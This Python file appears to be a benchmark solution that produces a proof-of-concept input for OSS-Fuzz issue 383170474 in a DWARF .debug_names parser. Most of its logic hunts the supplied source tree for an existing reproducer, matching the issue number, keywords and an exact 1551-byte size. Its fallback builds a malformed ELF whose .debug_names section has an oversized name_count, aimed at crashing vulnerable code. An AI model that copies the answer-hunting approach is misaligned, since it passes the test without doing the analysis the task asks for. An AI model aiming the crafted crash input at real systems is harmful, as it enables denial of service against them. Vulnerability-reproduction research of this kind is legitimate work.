import os
import tarfile
import re
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        data: bytes = b""
        if os.path.isdir(src_path):
            try:
                data = self._solve_dir(src_path)
            except Exception:
                data = b""
        else:
            try:
                if tarfile.is_tarfile(src_path):
                    with tarfile.open(src_path, "r:*") as tf:
                        data = self._solve_tar(tf)
            except Exception:
                data = b""
        if not data:
            data = self._fallback_poc()
        return data

    # ---- Tarball handling ----

    def _solve_tar(self, tf: tarfile.TarFile) -> bytes:
        members = [m for m in tf.getmembers() if m.isfile() and m.size > 0]

        best_score = -1
        best_data: bytes | None = None

        for m in members:
            name_lower = m.name.lower()
            size = m.size

            base = 0
            if "383170474" in name_lower:
                base += 200
            if "debug_names" in name_lower or "debugnames" in name_lower:
                base += 80
            for key in (
                "poc",
                "repro",
                "reproducer",
                "crash",
                "fuzz",
                "ossfuzz",
                "input",
                "testcase",
                "clusterfuzz",
            ):
                if key in name_lower:
                    base += 30

            diff = abs(size - 1551)
            length_score = max(0, 120 - diff // 5)
            if size == 1551:
                length_score += 150
            if base == 0 and diff > 0:
                length_score -= 20

            total = base + length_score
            if total <= 0:
                continue

            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                head = f.read(1024)
            except Exception:
                continue

            if not head:
                continue

            ascii_ratio = sum(
                (32 <= b < 127) or b in (9, 10, 13) for b in head
            ) / float(len(head))
            ext = os.path.splitext(name_lower)[1]
            if ascii_ratio > 0.9 and ext in (
                ".c",
                ".h",
                ".cc",
                ".cpp",
                ".txt",
                ".md",
                ".rst",
                ".py",
                ".sh",
                ".cmake",
                ".xml",
                ".json",
                ".html",
                ".yml",
                ".yaml",
                ".in",
                ".ac",
                ".am",
            ):
                total -= 80

            if size < 20 or size > 200000:
                total -= 40

            if total > best_score:
                best_score = total
                try:
                    f2 = tf.extractfile(m)
                    if not f2:
                        continue
                    best_data = f2.read()
                except Exception:
                    continue

        if best_score > 0 and best_data:
            return best_data

        data = self._search_embedded_poc_in_tar(tf, members)
        if data:
            return data

        return b""

    def _search_embedded_poc_in_tar(
        self, tf: tarfile.TarFile, members
    ) -> bytes:
        text_exts = (".c", ".h", ".cc", ".cpp", ".txt", ".md", ".rst", ".inc")
        id_strs = (
            "383170474",
            "oss-fuzz",
            "ossfuzz",
            "OSS-Fuzz",
            "debug_names",
            "debugnames",
        )

        for m in members:
            name_lower = m.name.lower()
            if not any(name_lower.endswith(ext) for ext in text_exts):
                continue
            if m.size > 800000:
                continue

            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                raw = f.read()
            except Exception:
                continue

            if not raw:
                continue

            try:
                text = raw.decode("utf-8", "ignore")
            except Exception:
                continue

            if not any(s in text for s in id_strs):
                continue

            mobj = re.search(
                r"(?:static\s+)?(?:const\s+)?(?:unsigned\s+char|uint8_t)\s+\w+\s*\[\s*\]\s*=\s*\{([^}]*)\}",
                text,
                re.S,
            )
            if mobj:
                content = mobj.group(1)
                tokens = re.findall(r"0x[0-9a-fA-F]+|\d+", content)
                if len(tokens) >= 8:
                    out = bytearray()
                    for tok in tokens:
                        try:
                            if tok.lower().startswith("0x"):
                                val = int(tok, 16)
                            else:
                                val = int(tok, 10)
                        except Exception:
                            continue
                        if 0 <= val <= 255:
                            out.append(val)
                    if out:
                        return bytes(out)

            for b64match in re.finditer(
                r'"([A-Za-z0-9+/=\s]{100,})"', text
            ):
                b64s = re.sub(r"\s+", "", b64match.group(1))
                if len(b64s) % 4 != 0:
                    continue
                try:
                    import base64

                    decoded = base64.b64decode(b64s, validate=False)
                except Exception:
                    continue
                if decoded and len(decoded) >= 50:
                    return decoded

        return b""

    # ---- Directory handling ----

    def _solve_dir(self, root: str) -> bytes:
        candidates: list[tuple[str, int]] = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size <= 0:
                    continue
                candidates.append((path, size))

        best_score = -1
        best_data: bytes | None = None

        for path, size in candidates:
            name_lower = path.lower()

            base = 0
            if "383170474" in name_lower:
                base += 200
            if "debug_names" in name_lower or "debugnames" in name_lower:
                base += 80
            for key in (
                "poc",
                "repro",
                "reproducer",
                "crash",
                "fuzz",
                "ossfuzz",
                "input",
                "testcase",
                "clusterfuzz",
            ):
                if key in name_lower:
                    base += 30

            diff = abs(size - 1551)
            length_score = max(0, 120 - diff // 5)
            if size == 1551:
                length_score += 150
            if base == 0 and diff > 0:
                length_score -= 20

            total = base + length_score
            if total <= 0:
                continue

            try:
                with open(path, "rb") as f:
                    head = f.read(1024)
            except OSError:
                continue

            if not head:
                continue

            ascii_ratio = sum(
                (32 <= b < 127) or b in (9, 10, 13) for b in head
            ) / float(len(head))
            ext = os.path.splitext(name_lower)[1]
            if ascii_ratio > 0.9 and ext in (
                ".c",
                ".h",
                ".cc",
                ".cpp",
                ".txt",
                ".md",
                ".rst",
                ".py",
                ".sh",
                ".cmake",
                ".xml",
                ".json",
                ".html",
                ".yml",
                ".yaml",
                ".in",
                ".ac",
                ".am",
            ):
                total -= 80

            if size < 20 or size > 200000:
                total -= 40

            if total > best_score:
                best_score = total
                try:
                    with open(path, "rb") as f2:
                        best_data = f2.read()
                except OSError:
                    continue

        if best_score > 0 and best_data:
            return best_data

        data = self._search_embedded_poc_in_dir(root)
        if data:
            return data

        return b""

    def _search_embedded_poc_in_dir(self, root: str) -> bytes:
        text_exts = (".c", ".h", ".cc", ".cpp", ".txt", ".md", ".rst", ".inc")
        id_strs = (
            "383170474",
            "oss-fuzz",
            "ossfuzz",
            "OSS-Fuzz",
            "debug_names",
            "debugnames",
        )

        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                name_lower = path.lower()
                if not any(name_lower.endswith(ext) for ext in text_exts):
                    continue

                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size > 800000:
                    continue

                try:
                    with open(path, "rb") as f:
                        raw = f.read()
                except OSError:
                    continue

                if not raw:
                    continue

                try:
                    text = raw.decode("utf-8", "ignore")
                except Exception:
                    continue

                if not any(s in text for s in id_strs):
                    continue

                mobj = re.search(
                    r"(?:static\s+)?(?:const\s+)?(?:unsigned\s+char|uint8_t)\s+\w+\s*\[\s*\]\s*=\s*\{([^}]*)\}",
                    text,
                    re.S,
                )
                if mobj:
                    content = mobj.group(1)
                    tokens = re.findall(r"0x[0-9a-fA-F]+|\d+", content)
                    if len(tokens) >= 8:
                        out = bytearray()
                        for tok in tokens:
                            try:
                                if tok.lower().startswith("0x"):
                                    val = int(tok, 16)
                                else:
                                    val = int(tok, 10)
                            except Exception:
                                continue
                            if 0 <= val <= 255:
                                out.append(val)
                        if out:
                            return bytes(out)

                for b64match in re.finditer(
                    r'"([A-Za-z0-9+/=\s]{100,})"', text
                ):
                    b64s = re.sub(r"\s+", "", b64match.group(1))
                    if len(b64s) % 4 != 0:
                        continue
                    try:
                        import base64

                        decoded = base64.b64decode(b64s, validate=False)
                    except Exception:
                        continue
                    if decoded and len(decoded) >= 50:
                        return decoded

        return b""

    # ---- Fallback PoC construction ----

    def _fallback_poc(self) -> bytes:
        try:
            return self._build_elf_with_debugnames()
        except Exception:
            return b"\x7fELF" + b"A" * 100

    def _build_elf_with_debugnames(self) -> bytes:
        elf_header_size = 64
        sh_entry_size = 64
        sh_num = 3
        shstr_index = 1

        shstrtab = b"\x00.shstrtab\x00.debug_names\x00"
        debug_names = self._build_simple_debug_names_section()

        def align(value: int, alignment: int) -> int:
            return (value + (alignment - 1)) & ~(alignment - 1)

        offset = elf_header_size

        shstrtab_offset = offset
        offset += len(shstrtab)

        offset = align(offset, 4)
        debug_names_offset = offset
        offset += len(debug_names)

        shoff = align(offset, 8)

        ei_magic = b"\x7fELF"
        ei_class = b"\x02"
        ei_data = b"\x01"
        ei_version = b"\x01"
        ei_osabi = b"\x00"
        ei_abiversion = b"\x00"
        ei_pad = b"\x00" * 7
        e_ident = (
            ei_magic
            + ei_class
            + ei_data
            + ei_version
            + ei_osabi
            + ei_abiversion
            + ei_pad
        )

        e_type = 1
        e_machine = 62
        e_version = 1
        e_entry = 0
        e_phoff = 0
        e_shoff = shoff
        e_flags = 0
        e_ehsize = elf_header_size
        e_phentsize = 0
        e_phnum = 0
        e_shentsize = sh_entry_size
        e_shnum = sh_num
        e_shstrndx = shstr_index

        elf_header = struct.pack(
            "<16sHHIQQQIHHHHHH",
            e_ident,
            e_type,
            e_machine,
            e_version,
            e_entry,
            e_phoff,
            e_shoff,
            e_flags,
            e_ehsize,
            e_phentsize,
            e_phnum,
            e_shentsize,
            e_shnum,
            e_shstrndx,
        )

        sh0 = b"\x00" * sh_entry_size

        sh_name1 = 1
        sh_type1 = 3  # SHT_STRTAB
        sh_flags1 = 0
        sh_addr1 = 0
        sh_offset1 = shstrtab_offset
        sh_size1 = len(shstrtab)
        sh_link1 = 0
        sh_info1 = 0
        sh_addralign1 = 1
        sh_entsize1 = 0

        sh1 = struct.pack(
            "<IIQQQQIIQQ",
            sh_name1,
            sh_type1,
            sh_flags1,
            sh_addr1,
            sh_offset1,
            sh_size1,
            sh_link1,
            sh_info1,
            sh_addralign1,
            sh_entsize1,
        )

        sh_name2 = 11
        sh_type2 = 1  # SHT_PROGBITS
        sh_flags2 = 0
        sh_addr2 = 0
        sh_offset2 = debug_names_offset
        sh_size2 = len(debug_names)
        sh_link2 = 0
        sh_info2 = 0
        sh_addralign2 = 1
        sh_entsize2 = 0

        sh2 = struct.pack(
            "<IIQQQQIIQQ",
            sh_name2,
            sh_type2,
            sh_flags2,
            sh_addr2,
            sh_offset2,
            sh_size2,
            sh_link2,
            sh_info2,
            sh_addralign2,
            sh_entsize2,
        )

        pad_after_shstrtab = b"\x00" * (
            debug_names_offset - (shstrtab_offset + len(shstrtab))
        )
        pad_before_sh = b"\x00" * (
            shoff - (debug_names_offset + len(debug_names))
        )

        return (
            elf_header
            + shstrtab
            + pad_after_shstrtab
            + debug_names
            + pad_before_sh
            + sh0
            + sh1
            + sh2
        )

    def _build_simple_debug_names_section(self) -> bytes:
        version = 5
        padding = 0
        cu_count = 1
        local_tu_count = 0
        foreign_tu_count = 0
        bucket_count = 1
        # Deliberately huge name_count to stress calculations in vulnerable code.
        name_count = 0x40000000
        abbrev_table_size = 16
        augmentation_string_size = 0

        header_rest = struct.pack(
            "<HHIIIIII",
            version,
            padding,
            cu_count,
            local_tu_count,
            foreign_tu_count,
            bucket_count,
            name_count,
            abbrev_table_size,
        )
        header_without_length_rest = header_rest + struct.pack(
            "<I", augmentation_string_size
        )

        buckets = struct.pack("<I", 0)
        names = struct.pack("<I", 0)
        abbrev_table = b"\x01\x11\x11\x00" + b"\x00" * (abbrev_table_size - 4)
        entry_pool = b"\x00" * 32

        body_without_length = (
            header_without_length_rest + buckets + names + abbrev_table + entry_pool
        )
        unit_length = len(body_without_length)

        header = struct.pack("<I", unit_length) + header_without_length_rest

        return header + buckets + names + abbrev_table + entry_pool